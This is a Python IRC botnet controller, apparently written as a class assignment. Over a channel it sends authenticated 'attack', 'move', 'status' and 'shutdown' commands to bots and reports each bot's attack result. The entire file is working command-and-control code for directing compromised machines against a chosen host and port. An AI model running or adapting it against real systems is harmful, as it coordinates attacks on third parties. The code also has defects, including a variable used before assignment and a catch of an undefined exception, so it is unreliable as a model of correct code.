#python3 conbot.py server port  username password

import argparse
import sys
import socket
import time
import re

def parsemsg(s):
    prefix = ''
    trailing = []
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        arg = s.split()
        arg.append(trailing)
    else:
        arg = s.split()
    command = arg.pop(0)
    return prefix, command, arg

#send to a channel
def chat(sock, channel,  msg):
    sock.send(("PRIVMSG #{} :{}\r\n".format(channel, msg)).encode("utf-8"))
  
#send status message to the server and report what bots responded with their information    
def status(soc, chan):
    botList = []
    chat(soc,chan,secret)
    time.sleep(15)
    chat(soc, chan, "status")
    timeout = time.time()+ 5
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    #print("The that responded to the status request are:")
    count = 0
    for str in responses:
        if("PRIVMSG " + name in str) :
            #assume the send format will always be PRIVMSG conbot :message and conbot will always be the conbot name
            botName = str.split(":")[-1]
            print(botName)
            botList.append(botName)
            count += 1
    print("Found {} bots: {} ".format(count,', '.join(botList))  )
    #print(response)
#send attack message to the bots and have them respond with their attack diagnostics    
def attack(soc, chan, hostname, port):
    #print("attack {} {}".format(hostname, port))
    chat(soc, chan, "attack {} {}".format(hostname, port))
    timeout = time.time()+5 #5s from now
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    total = 0
    successes = 0
    failures = 0
    for str in responses:
        botname = str.split("!")
        botname = botname[0]
        if(len(str) > 0 and "ING" not in str):
            total += 1
            if "Success" in str:
                print("{}: Attack successful".format(botname[1:])) 
                successes +=1
            else:
                print("{}: Attack failed".format(botname[1:]))
                failures +=1
    if(total == 0):
        print("No attacks were carried out")
    else:
        print("Total of {} successes and {} failures".format(successes,failures))

#send move message to the bots and report what bots moved with their information  
def move(soc, chan, hostname, port, channel):
    chat(soc,chan,secret)
    chat(soc, chan, "move {} {} {}".format(hostname, port, channel))
    botList = []
    timeout = time.time()+35 
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    count = 0
    for str in responses:
        if("PRIVMSG " + name in str) :
            #assume the send format will always be PRIVMSG conbot :message and conbot will always be the conbot name
            botName = str.split("moved")[-1]
            botName = botName.strip()
            print(botName + " successfully moved")
            botList.append(botName)
            count += 1
    if not botList:
        print("No successful move")

#send shutdown message to bots and report which ones shut down
def shutdown(soc, chan):
    botList = []
    chat(soc,chan,secret)
    time.sleep(5)
    chat(soc,chan,"shutdown")
    timeout = time.time()+5 #5s from now
    response = ""
    while True:
        if(time.time() > timeout):
            break
        try:
            response += soc.recv(1024).decode("utf-8")
        except socket.error:
            None
    responses = response.split("\r\n")
    shutdown = []
    for str in responses:
        if("PRIVMSG " + name in str) :
            #assume the send format will always be PRIVMSG conbot :message and conbot will always be the conbot name
            botName = str.split("shutdown")[-1]
            botName = botName.strip()
            print(botName + " shutting down")
        if len(str)>0 and "shutdown" in str:
            starting = str.find("shutdown")
            shutdown.append(str[starting+9:])         
    print("Total {} bots shut down".format(len(shutdown)))
    
    
#start initial connection
def connect(name, args):
    sock = socket.socket()
    sock.connect((args.hostname, args.port))
    sock.send("NICK {}\r\n".format(name).encode("utf-8"))
    sock.settimeout(.1)
    sock.send("USER {} * * {}\r\n".format(name,name).encode("utf-8"))
    sock.send("JOIN #{}\r\n".format(args.channel).encode("utf-8"))
    return sock, name
    
    
#check port
def port_type(x):
    x = int(x)
    if x not in range(1,65535):
        raise argparse.ArgumentTypeError("Port must be integers in the range 1-65535")
    return x 
    
#initialize command line arguments    
def parseArgs():
    #Set up the required arguements
    #Set up the required arguements
    parser = argparse.ArgumentParser(description = "Assignment 5")
    parser.add_argument("hostname", type = str, help="server")
    parser.add_argument("port", type = port_type, help="port")
    parser.add_argument("channel", type=str,help="channel")
    parser.add_argument("secret", type=str, help="password")
    args = parser.parse_args()
    return args

def main():
    #initialize variables and connect to server
    args = parseArgs()
    global secret
    secret = args.secret
    global name
    try:
        soc, name = connect("conbot1",args)
        print("Controller is running. Connecting with nick: " + name)
        time.sleep(.5)
        (prefix, command, arg)= parsemsg(response)                
        #change nick if it is being used
        if command == "433":
            print("nick is in use and retrying with nick " + name)
            soc, name = connect(name,args)
            print("Controller is running. Connecting with nick: " + name)
        chat(soc, args.channel, args.secret)
    except:
        #connection fail reconnecting with new nick
        name = name[0]+name[1]+name[2]+name[3]+name[4]+name[5]+chr(ord(name[6])+1)
        print("nick is in use and retrying with nick " + name)
        soc, name = connect(name,args)
        print("Controller is running. Connecting with nick: " + name)
        time.sleep(.5)
        chat(soc, args.channel, args.secret)
    try:
        response = soc.recv(1024).decode("utf-8")
        print(response)
    except Error:
        print("Error recieving from socket")
    while True:
        #run loop checking for messages in the server
        try:
            response = soc.recv(1024).decode("utf-8")
            print(response)
            if response.find ( 'PING' ) != -1:
                soc.send ( ('PONG ' + response.split() [ 1 ] + '\r\n').encode("utf-8"))
            if response.find ( 'PONG' ) != -1:
                soc.send ( ('PING ' + response.split() [ 1 ] + '\r\n').encode("utf-8"))
        except socket.error:
            None
        time.sleep(15)
        message = input("command> ")
        if(message == "status"):
                status(soc, args.channel)
        elif(message == "quit"):
            break
        elif(message == "shutdown"):
            shutdown(soc,args.channel)
        else:
            inputlist = message.split()
            if(inputlist[0] == "attack" and len(inputlist) == 3):
                attack(soc, args.channel, inputlist[1], inputlist[2])
            elif(inputlist[0] == "move" and len(inputlist) == 4):
                move(soc, args.channel, inputlist[1], inputlist[2], inputlist[3])
      
    soc.close()
    print("Shutting down the controller...")

main()
